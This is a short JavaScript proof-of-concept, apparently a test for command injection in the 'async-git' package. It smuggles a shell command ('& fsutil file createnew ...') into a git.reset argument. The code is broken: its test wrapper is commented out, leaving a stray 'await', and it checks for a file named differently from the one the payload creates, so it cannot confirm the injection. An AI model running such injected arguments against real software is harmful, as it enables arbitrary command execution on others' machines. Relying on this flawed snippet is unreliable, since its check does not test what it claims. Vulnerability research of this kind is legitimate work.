// test("Command Injection in async-git", async () => {
//   expect.assertions(2);
  const git = require("async-git");
  const fs = require("fs");
  const path = "./async-git";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    await git.reset("& fsutil file createnew apex-publish-static-files 0 &");
  } catch (e) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
